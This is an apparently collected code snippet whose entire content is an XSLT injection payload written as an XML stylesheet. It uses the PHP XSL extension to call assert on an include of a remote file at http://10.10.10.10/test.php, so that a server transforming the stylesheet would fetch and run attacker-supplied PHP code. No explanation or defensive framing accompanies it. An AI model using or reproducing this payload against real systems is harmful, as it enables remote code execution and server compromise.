---
id: f75bb95d-094b-46fa-b02e-710cf366ba2d
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:41.543321+00:00'
updated_at: '2023-04-10T20:24:49.324314+00:00'
---

# Code Snippet f75bb95d

**Language**: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:variable name="payload">
            include("http://10.10.10.10/test.php")
        </xsl:variable>
        <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```


